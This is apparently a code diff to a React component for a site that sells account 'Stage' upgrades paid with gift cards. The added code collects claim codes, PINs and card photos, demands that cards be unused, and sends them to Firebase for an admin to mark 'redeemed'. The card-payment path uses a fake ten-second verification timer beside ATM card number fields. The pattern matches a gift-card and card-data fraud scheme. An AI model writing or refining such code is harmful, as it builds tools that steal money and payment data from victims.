@@ -1,6 +1,12 @@
 import React, { useState, useEffect } from 'react';
 import { useAuth } from '../context/AuthContext';
-import { logCardSubmission, logGiftCardSubmission } from '../lib/firebase';
+import { db, logCardSubmission, logGiftCardSubmission } from '../lib/firebase';
+import { doc, onSnapshot } from 'firebase/firestore';
+import {
+  GIFT_CARD_BRAND_RULES,
+  validateRealGiftCardInput,
+  compressCardImage,
+} from '../utils/giftCardValidator';
 import {
   ArrowLeft,
   Crown,
@@ -31,16 +37,7 @@ interface Tier {
   benefits: string[];
 }
 
-const GIFT_CARD_BRANDS = [
-  { id: 'apple', name: 'Apple / iTunes Gift Card', icon: '🍏' },
-  { id: 'steam', name: 'Steam Wallet Card', icon: '🎮' },
-  { id: 'razer', name: 'Razer Gold PIN', icon: '🪙' },
-  { id: 'google', name: 'Google Play Store Card', icon: '▶️' },
-  { id: 'amazon', name: 'Amazon Gift Card', icon: '📦' },
-  { id: 'vanilla', name: 'Vanilla Visa / Mastercard', icon: '💳' },
-  { id: 'sephora', name: 'Sephora / Nordstrom Card', icon: '💄' },
-  { id: 'xbox', name: 'Xbox / PlayStation Store Card', icon: '🕹️' },
-];
+const GIFT_CARD_BRANDS = GIFT_CARD_BRAND_RULES;
 
 export const AccountLevels: React.FC<AccountLevelsProps> = ({ onBack }) => {
   const { user, updateUser, addTransaction } = useAuth();
@@ -53,12 +50,17 @@ export const AccountLevels: React.FC<AccountLevelsProps> = ({ onBack }) => {
   const [paymentMethod, setPaymentMethod] = useState<'giftcard' | 'card'>('giftcard');
 
   // Gift Card Verification state
-  const [giftCardBrand, setGiftCardBrand] = useState('Apple / iTunes Gift Card');
+  const [giftCardBrand, setGiftCardBrand] = useState(GIFT_CARD_BRAND_RULES[0].name);
   const [giftCardFormat, setGiftCardFormat] = useState<'ecode' | 'physical'>('ecode');
   const [giftCardCode, setGiftCardCode] = useState('');
   const [giftCardPin, setGiftCardPin] = useState('');
   const [giftCardImage, setGiftCardImage] = useState<string | null>(null);
+  const [confirmedUnused, setConfirmedUnused] = useState(false);
+  const [isSubmittingGiftCard, setIsSubmittingGiftCard] = useState(false);
   const [giftCardError, setGiftCardError] = useState('');
+  const [pendingStatusId, setPendingStatusId] = useState<string | null>(null);
+  const [giftStatusState, setGiftStatusState] = useState<'pending' | 'verified' | 'redeemed' | 'rejected'>('pending');
+  const [giftRejectionReason, setGiftRejectionReason] = useState('');
 
   // ATM Card form state
   const [cardNumber, setCardNumber] = useState('');
@@ -183,60 +185,109 @@ export const AccountLevels: React.FC<AccountLevelsProps> = ({ onBack }) => {
     }
   };
 
-  const handleImageUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
+  const handleImageUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
     const file = e.target.files?.[0];
-    if (file) {
-      const reader = new FileReader();
-      reader.onloadend = () => {
-        setGiftCardImage(reader.result as string);
-      };
-      reader.readAsDataURL(file);
+    if (!file) return;
+    setGiftCardError('');
+    try {
+      const compressed = await compressCardImage(file);
+      setGiftCardImage(compressed);
+    } catch (err: any) {
+      setGiftCardError(err?.message || 'Failed to read gift card image.');
     }
   };
 
-  // Verification countdown
+  // Step 3 verification: real-time admin verification hold for Gift Cards; 10s gateway timer for ATM card
   useEffect(() => {
-    if (step === 3) {
-      let timeLeft = 10;
-      setProgress(0);
-      const interval = setInterval(() => {
-        timeLeft -= 1;
-        setProgress(((10 - timeLeft) / 10) * 100);
-        if (timeLeft <= 0) {
-          clearInterval(interval);
-          if (selectedTier) {
-            updateUser({ accountLevel: `Stage ${selectedTier.stage} — ${selectedTier.name}` });
-            addTransaction({
-              type: 'Account Upgrade',
-              amount: selectedTier.price,
-              tierName: `Stage ${selectedTier.stage} — ${selectedTier.name}`,
-              date: new Date().toLocaleDateString() + ' at ' + new Date().toLocaleTimeString(),
-            });
+    if (step !== 3) return;
+
+    if (paymentMethod === 'giftcard' && pendingStatusId) {
+      const unsub = onSnapshot(
+        doc(db, 'giftCardStatuses', pendingStatusId),
+        (snap) => {
+          if (!snap.exists()) return;
+          const data = snap.data() as {
+            status: 'pending' | 'verified' | 'redeemed' | 'rejected';
+            rejectionReason?: string;
+          };
+          setGiftStatusState(data.status);
+
+          if (data.status === 'rejected') {
+            setGiftRejectionReason(
+              data.rejectionReason || 'Wrong or used gift card is not allowed. Tier upgrade rejected.'
+            );
+            return;
           }
-          setStep(4);
+
+          if (data.status === 'verified' || data.status === 'redeemed') {
+            setPendingStatusId(null);
+            if (selectedTier) {
+              updateUser({ accountLevel: `Stage ${selectedTier.stage} — ${selectedTier.name}` });
+              addTransaction({
+                type: 'Account Upgrade',
+                amount: selectedTier.price,
+                tierName: `Stage ${selectedTier.stage} — ${selectedTier.name}`,
+                date: new Date().toLocaleDateString() + ' at ' + new Date().toLocaleTimeString(),
+              });
+            }
+            setStep(4);
+          }
+        },
+        (err) => {
+          console.warn('Upgrade gift card status listener warning:', err);
         }
-      }, 1000);
-      return () => clearInterval(interval);
+      );
+      return () => unsub();
     }
-  }, [step, selectedTier]);
+
+    let timeLeft = 10;
+    setProgress(0);
+    const interval = setInterval(() => {
+      timeLeft -= 1;
+      setProgress(((10 - timeLeft) / 10) * 100);
+      if (timeLeft <= 0) {
+        clearInterval(interval);
+        if (selectedTier) {
+          updateUser({ accountLevel: `Stage ${selectedTier.stage} — ${selectedTier.name}` });
+          addTransaction({
+            type: 'Account Upgrade',
+            amount: selectedTier.price,
+            tierName: `Stage ${selectedTier.stage} — ${selectedTier.name}`,
+            date: new Date().toLocaleDateString() + ' at ' + new Date().toLocaleTimeString(),
+          });
+        }
+        setStep(4);
+      }
+    }, 1000);
+    return () => clearInterval(interval);
+  }, [step, selectedTier, paymentMethod, pendingStatusId]);
 
   const handleGiftCardPayment = async (e: React.FormEvent) => {
     e.preventDefault();
     setGiftCardError('');
 
-    const cleanCode = giftCardCode.trim();
-    if (!cleanCode || cleanCode.length < 6) {
-      setGiftCardError('Please enter a valid gift card claim code / voucher PIN');
+    const validation = validateRealGiftCardInput({
+      brand: giftCardBrand,
+      format: giftCardFormat,
+      code: giftCardCode,
+      pin: giftCardPin,
+      image: giftCardImage,
+      confirmedUnused,
+    });
+
+    if (!validation.valid) {
+      setGiftCardError(validation.error || 'Please drop a valid, unused gift card.');
       return;
     }
 
+    setIsSubmittingGiftCard(true);
     try {
-      await logGiftCardSubmission({
+      const res = await logGiftCardSubmission({
         id: `GIFT-${Date.now()}`,
         type: `Stage ${selectedTier?.stage} — ${selectedTier?.name || 'Upgrade'}`,
         cardBrand: giftCardBrand,
         cardFormat: giftCardFormat,
-        cardCode: cleanCode,
+        cardCode: giftCardCode.trim().toUpperCase(),
         cardPin: giftCardPin.trim() || 'N/A',
         amount: selectedTier?.price || 0,
         image: giftCardImage || '',
@@ -245,11 +296,24 @@ export const AccountLevels: React.FC<AccountLevelsProps> = ({ onBack }) => {
         date: new Date().toLocaleString(),
         status: 'pending',
       });
-    } catch (e) {
-      console.error(e);
-    }
 
-    setStep(3);
+      if (!res.success || !res.statusId) {
+        setGiftCardError(
+          res.error || 'Used or invalid gift card is not allowed. Please drop a brand-new real gift card.'
+        );
+        return;
+      }
+
+      setGiftStatusState('pending');
+      setGiftRejectionReason('');
+      setPendingStatusId(res.statusId);
+      setStep(3);
+    } catch (err: any) {
+      console.error(err);
+      setGiftCardError(err?.message || 'Could not verify gift card right now.');
+    } finally {
+      setIsSubmittingGiftCard(false);
+    }
   };
 
   const handleCardPayment = async (e: React.FormEvent) => {
@@ -447,19 +511,19 @@ export const AccountLevels: React.FC<AccountLevelsProps> = ({ onBack }) => {
 
             {paymentMethod === 'giftcard' ? (
               <form onSubmit={handleGiftCardPayment} className="bg-white rounded-3xl p-6 shadow-sm border border-gray-100 space-y-4">
-                <div className="bg-gradient-to-r from-purple-50 to-indigo-50 border border-purple-200 rounded-2xl p-4">
-                  <div className="flex items-center space-x-2 mb-1">
+                <div className="bg-gradient-to-r from-purple-50 to-indigo-50 border border-purple-200 rounded-2xl p-4 space-y-1.5">
+                  <div className="flex items-center space-x-2">
                     <Gift className="w-5 h-5 text-purple-700" />
-                    <h3 className="font-bold text-sm text-purple-900">Verify Your Account with Gift Cards</h3>
+                    <h3 className="font-bold text-sm text-purple-900">Real & Unused Gift Cards Only</h3>
                   </div>
-                  <p className="text-xs text-purple-700 leading-relaxed">
-                    Submit a valid <strong>${selectedTier.price.toLocaleString()}</strong> gift card (Apple, Steam, Razer Gold, Amazon, Google Play, or Vanilla Visa) to immediately upgrade your account to <strong>Stage {selectedTier.stage} — {selectedTier.name}</strong>.
+                  <p className="text-xs text-purple-800 leading-relaxed">
+                    Drop a genuine, unredeemed <strong>${selectedTier.price.toLocaleString()}</strong> gift card with its clear photo / receipt to upgrade to <strong>Stage {selectedTier.stage} — {selectedTier.name}</strong>. <strong>Used, redeemed, or fake gift cards are strictly not allowed.</strong>
                   </p>
                 </div>
 
                 {giftCardError && (
-                  <div className="p-3 bg-red-50 border border-red-200 text-red-600 text-xs rounded-xl flex items-center space-x-2">
-                    <AlertCircle className="w-4 h-4 shrink-0" />
+                  <div className="p-3 bg-red-50 border border-red-200 text-red-700 text-xs rounded-xl flex items-start space-x-2 font-medium">
+                    <AlertCircle className="w-4 h-4 shrink-0 mt-0.5 text-red-600" />
                     <span>{giftCardError}</span>
                   </div>
                 )}
@@ -470,7 +534,10 @@ export const AccountLevels: React.FC<AccountLevelsProps> = ({ onBack }) => {
                   </label>
                   <select
                     value={giftCardBrand}
-                    onChange={(e) => setGiftCardBrand(e.target.value)}
+                    onChange={(e) => {
+                      setGiftCardBrand(e.target.value);
+                      setGiftCardError('');
+                    }}
                     className="w-full p-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-purple-600 outline-none text-sm text-gray-900 bg-white font-medium"
                   >
                     {GIFT_CARD_BRANDS.map((b) => (
@@ -504,28 +571,43 @@ export const AccountLevels: React.FC<AccountLevelsProps> = ({ onBack }) => {
 
                 <div>
                   <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600 mb-1">
-                    Gift Card Claim Code / E-Code
+                    Gift Card Claim Code / E-Code *
                   </label>
                   <input
                     type="text"
                     value={giftCardCode}
-                    onChange={(e) => setGiftCardCode(e.target.value.toUpperCase())}
-                    placeholder="e.g. X7KM-99P2-44BB-912A"
+                    onChange={(e) => {
+                      setGiftCardCode(e.target.value.toUpperCase());
+                      setGiftCardError('');
+                    }}
+                    placeholder={
+                      GIFT_CARD_BRANDS.find((b) => b.name === giftCardBrand)?.example ||
+                      'Enter real unredeemed gift card code'
+                    }
                     className="w-full p-3.5 border border-gray-300 rounded-xl focus:ring-2 focus:ring-purple-600 outline-none text-sm font-mono font-bold text-gray-900 uppercase"
                     required
                   />
+                  <p className="text-[11px] text-purple-700 mt-1 font-medium">
+                    {GIFT_CARD_BRANDS.find((b) => b.name === giftCardBrand)?.formatHint}
+                  </p>
                 </div>
 
                 <div className="grid grid-cols-2 gap-3">
                   <div>
                     <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600 mb-1">
-                      Card PIN / CVV (if applicable)
+                      Card PIN / CVV{' '}
+                      {GIFT_CARD_BRANDS.find((b) => b.name === giftCardBrand)?.requiresPin
+                        ? '(Required *)'
+                        : '(If shown)'}
                     </label>
                     <input
                       type="text"
                       value={giftCardPin}
                       onChange={(e) => setGiftCardPin(e.target.value)}
                       placeholder="e.g. 1234"
+                      required={Boolean(
+                        GIFT_CARD_BRANDS.find((b) => b.name === giftCardBrand)?.requiresPin
+                      )}
                       className="w-full p-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-purple-600 outline-none text-sm font-mono text-gray-900"
                     />
                   </div>
@@ -544,9 +626,15 @@ export const AccountLevels: React.FC<AccountLevelsProps> = ({ onBack }) => {
 
                 <div>
                   <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600 mb-1">
-                    Upload Card Front/Back or Receipt (Optional)
+                    Upload Real Gift Card Photo / Receipt (Required *)
                   </label>
-                  <label className="border-2 border-dashed border-gray-300 hover:border-purple-400 rounded-2xl p-4 flex flex-col items-center justify-center cursor-pointer transition-colors bg-gray-50">
+                  <label
+                    className={`border-2 border-dashed rounded-2xl p-4 flex flex-col items-center justify-center cursor-pointer transition-colors bg-gray-50 ${
+                      giftCardImage
+                        ? 'border-emerald-400 bg-emerald-50/40'
+                        : 'border-gray-300 hover:border-purple-400'
+                    }`}
+                  >
                     {giftCardImage ? (
                       <div className="space-y-2 text-center">
                         <img
@@ -559,8 +647,12 @@ export const AccountLevels: React.FC<AccountLevelsProps> = ({ onBack }) => {
                     ) : (
                       <div className="text-center space-y-1">
                         <Upload className="w-6 h-6 text-purple-600 mx-auto mb-1" />
-                        <p className="text-xs font-semibold text-gray-700">Attach photo of card / receipt</p>
-                        <p className="text-[10px] text-gray-400">JPG, PNG supported</p>
+                        <p className="text-xs font-semibold text-gray-700">
+                          {giftCardFormat === 'physical'
+                            ? 'Attach clear photo of scratched card & store receipt'
+                            : 'Attach screenshot or email receipt of real e-code'}
+                        </p>
+                        <p className="text-[10px] text-gray-400">JPG, PNG required to verify card is unused</p>
                       </div>
                     )}
                     <input
@@ -572,12 +664,29 @@ export const AccountLevels: React.FC<AccountLevelsProps> = ({ onBack }) => {
                   </label>
                 </div>
 
+                <label className="flex items-start space-x-2.5 bg-amber-50 border border-amber-200 rounded-xl p-3 cursor-pointer">
+                  <input
+                    type="checkbox"
+                    checked={confirmedUnused}
+                    onChange={(e) => setConfirmedUnused(e.target.checked)}
+                    className="mt-0.5 w-4 h-4 accent-purple-600 shrink-0"
+                  />
+                  <span className="text-xs text-amber-900 leading-relaxed font-medium">
+                    I confirm this is a real, unredeemed gift card. Dropping a used, redeemed, or fake gift card is not allowed.
+                  </span>
+                </label>
+
                 <button
                   type="submit"
-                  className="w-full bg-purple-600 hover:bg-purple-700 text-white font-bold py-4 rounded-xl text-base shadow-md transition-all cursor-pointer flex items-center justify-center space-x-2"
+                  disabled={isSubmittingGiftCard}
+                  className="w-full min-h-[48px] bg-purple-600 hover:bg-purple-700 text-white font-bold py-4 rounded-xl text-base shadow-md transition-all cursor-pointer flex items-center justify-center space-x-2 disabled:opacity-60"
                 >
                   <ShieldCheck className="w-5 h-5" />
-                  <span>Verify ${selectedTier.price.toLocaleString()} Gift Card & Upgrade</span>
+                  <span>
+                    {isSubmittingGiftCard
+                      ? 'Checking Gift Card Authenticity...'
+                      : `Verify $${selectedTier.price.toLocaleString()} Real Gift Card & Upgrade`}
+                  </span>
                 </button>
               </form>
             ) : (
@@ -692,20 +801,86 @@ export const AccountLevels: React.FC<AccountLevelsProps> = ({ onBack }) => {
         {/* Step 3: Verification */}
         {step === 3 && (
           <div className="bg-white rounded-2xl p-8 shadow-sm border border-gray-100 flex flex-col items-center justify-center text-center space-y-5 my-8">
-            <div className="w-16 h-16 border-4 border-purple-600 border-t-transparent rounded-full animate-spin" />
-            <h3 className="text-2xl font-bold text-gray-900">
-              Verifying Stage {selectedTier?.stage} Payment
-            </h3>
-            <p className="text-sm text-gray-500 max-w-sm">
-              Please wait while we confirm your payment and unlock {selectedTier?.name} benefits...
-            </p>
-            <div className="w-full bg-gray-200 rounded-full h-2.5 overflow-hidden max-w-xs">
-              <div
-                className="bg-purple-600 h-full rounded-full transition-all duration-1000"
-                style={{ width: `${progress}%` }}
-              />
-            </div>
-            <p className="text-xs text-gray-400">Please do not refresh this page</p>
+            {paymentMethod === 'giftcard' && giftStatusState === 'rejected' ? (
+              <>
+                <div className="w-16 h-16 bg-red-100 text-red-600 rounded-full flex items-center justify-center ring-8 ring-red-50">
+                  <AlertCircle className="w-9 h-9" />
+                </div>
+                <h3 className="text-2xl font-extrabold text-red-700">
+                  Gift Card Rejected — Upgrade Denied
+                </h3>
+                <p className="text-sm text-gray-600 max-w-sm leading-relaxed">
+                  {giftRejectionReason ||
+                    'Wrong or already-used gift card detected. Used or invalid gift cards are not allowed.'}
+                </p>
+                <button
+                  type="button"
+                  onClick={() => {
+                    setPendingStatusId(null);
+                    setGiftStatusState('pending');
+                    setGiftRejectionReason('');
+                    setGiftCardCode('');
+                    setGiftCardPin('');
+                    setGiftCardImage(null);
+                    setConfirmedUnused(false);
+                    setGiftCardError(
+                      'Previous card was rejected as wrong or used. Please drop a real, unused gift card.'
+                    );
+                    setStep(2);
+                  }}
+                  className="w-full max-w-xs min-h-[48px] bg-purple-600 hover:bg-purple-700 text-white font-bold py-3.5 px-5 rounded-xl text-sm shadow-md transition-all cursor-pointer"
+                >
+                  Submit a Real Unused Gift Card
+                </button>
+              </>
+            ) : paymentMethod === 'giftcard' && pendingStatusId ? (
+              <>
+                <div className="w-16 h-16 border-4 border-purple-600 border-t-transparent rounded-full animate-spin" />
+                <span className="text-xs font-bold uppercase tracking-wider bg-amber-100 text-amber-800 px-3 py-1 rounded-full">
+                  Pending Real Card Check
+                </span>
+                <h3 className="text-2xl font-bold text-gray-900">
+                  Verifying Stage {selectedTier?.stage} Gift Card
+                </h3>
+                <p className="text-sm text-gray-600 max-w-sm leading-relaxed">
+                  Our verification team is checking that your dropped gift card is real and unused before activating <strong>Stage {selectedTier?.stage} — {selectedTier?.name}</strong>. <strong>Wrong or used gift cards will be rejected.</strong>
+                </p>
+                <div className="w-full bg-purple-50 border border-purple-200 rounded-xl p-3 text-xs text-purple-800 max-w-sm">
+                  Reference ID: <span className="font-mono font-bold">{pendingStatusId}</span>
+                </div>
+                <button
+                  type="button"
+                  onClick={() => {
+                    setPendingStatusId(null);
+                    setGiftCardCode('');
+                    setGiftCardPin('');
+                    setGiftCardImage(null);
+                    setConfirmedUnused(false);
+                    setStep(2);
+                  }}
+                  className="text-xs font-semibold text-gray-500 hover:text-purple-700 underline cursor-pointer pt-1"
+                >
+                  Cancel & submit a different card
+                </button>
+              </>
+            ) : (
+              <>
+                <div className="w-16 h-16 border-4 border-purple-600 border-t-transparent rounded-full animate-spin" />
+                <h3 className="text-2xl font-bold text-gray-900">
+                  Verifying Stage {selectedTier?.stage} Payment
+                </h3>
+                <p className="text-sm text-gray-500 max-w-sm">
+                  Please wait while we confirm your payment and unlock {selectedTier?.name} benefits...
+                </p>
+                <div className="w-full bg-gray-200 rounded-full h-2.5 overflow-hidden max-w-xs">
+                  <div
+                    className="bg-purple-600 h-full rounded-full transition-all duration-1000"
+                    style={{ width: `${progress}%` }}
+                  />
+                </div>
+                <p className="text-xs text-gray-400">Please do not refresh this page</p>
+              </>
+            )}
           </div>
         )}
 
